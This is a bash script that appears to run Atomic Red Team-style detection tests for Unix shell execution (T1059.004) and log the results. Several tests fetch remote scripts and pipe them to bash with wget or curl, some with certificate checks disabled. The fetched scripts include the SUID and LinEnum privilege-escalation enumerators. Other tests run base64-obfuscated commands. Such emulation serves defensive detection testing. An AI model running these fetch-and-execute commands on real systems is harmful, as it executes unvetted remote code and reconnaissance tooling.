#!/bin/bash

# Create the output folder if it doesn't exist
output_folder="./Linux_output/Execution"
mkdir -p "$output_folder"

# Output file path
output_file="$output_folder/T1059.004_Execution.txt"

{
    # SISA Test #1 - Create and Execute Bash Shell Script
    echo "Running SISA Test #1 - Create and Execute Bash Shell Script"
    script_path=/tmp/sisa.sh
    sh -c "echo 'echo Hello from the SISA' > ${script_path}"
    sh -c "echo 'ping -c 4 8.8.8.8' >> ${script_path}"
    chmod +x ${script_path}
    sh ${script_path}
    rm ${script_path}

    # SISA Test #2 - Command-Line Interface
    echo "Running SISA Test #2 - Command-Line Interface"
    wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash

    # SISA Test #3 - Harvest SUID executable files
    echo "Running SISA Test #3 - Harvest SUID executable files"
    if [ -x "$(command -v wget)" ]; then
      wget -q https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh -O /tmp/AutoSUID.sh
    else
      curl -sS https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh | bash
    fi
    chmod +x /tmp/AutoSUID.sh
    /tmp/AutoSUID.sh
    rm -rf /tmp/AutoSUID.sh

    # SISA Test #4 - LinEnum tool execution
    if [ -x "$(command -v wget)" ]; then
      wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh -O /tmp/LinEnum.sh
    else
      curl -sS https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh | bash
    fi
    chmod +x /tmp/LinEnum.sh
    /tmp/LinEnum.sh
    rm -rf /tmp/LinEnum.sh

    # SISA Test #5 - New script file in the tmp directory
    echo "Running SISA Test #5 - New script file in the tmp directory"
    TMPFILE=$(mktemp)
    echo "id" > $TMPFILE
    bash $TMPFILE
    rm $TMPFILE
    unset TMPFILE

    # SISA Test #6 - What shell is running
    echo "Running SISA Test #6 - What shell is running"
    echo $0
    if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
    if $(printenv SHELL >/dev/null); then printenv SHELL; fi

    # SISA Test #7 - What shells are available
    echo "Running SISA Test #7 - What shells are available"
    cat /etc/shells

    # SISA Test #8 - Command line scripts
    echo "Running SISA Test #8 - Command line scripts"
    for i in $(seq 1 5); do echo "$i, SISA was here!"; sleep 1; done

    # SISA Test #9 - Obfuscated command line scripts
    echo "Running SISA Test #9 - Obfuscated command line scripts"
    [ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" && OLDIFS="$IFS" && IFS=$'\n' && read -d '' -r -a lines <<<"$(wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/obfuscated.sh)" && IFS="$OLDIFS" && for line in "${lines[@]}"; do echo "$line"; done | bash && unset lines || encodecmd="base64 -w 0" && decodecmd="base64 -d"
    ART=$(echo -n "id" | $encodecmd)
    echo "\$ART=$ART"
    echo -n "$ART" | $decodecmd |/bin/bash
    unset ART

    # SISA Test #10 - Change login shell
    echo "Running SISA Test #10 - Change login shell"
    # This test is disabled as it requires root privileges

    # SISA Test #11 - Environment variable scripts
    echo "Running SISA Test #11 - Environment variable scripts"
    export ART='echo "SISA was here... T1059.004"'
    echo $ART |/bin/sh
    unset ART

    # SISA Test #12 - Detecting pipe-to-shell
    echo "Running SISA Test #12 - Detecting pipe-to-shell"
    if [ -x "$(command -v wget)" ]; then
      wget -q --no-check-certificate -O /tmp/pipe-to-shell.sh "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
    else
      curl -sS -k https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -o pipefail -e -
    fi
    bash /tmp/pipe-to-shell.sh
    rm -rf /tmp/pipe-to-shell.sh

    echo "All SISA tests completed."
} > "$output_file" 2>&1

echo "Execution completed. Output saved to $output_file"
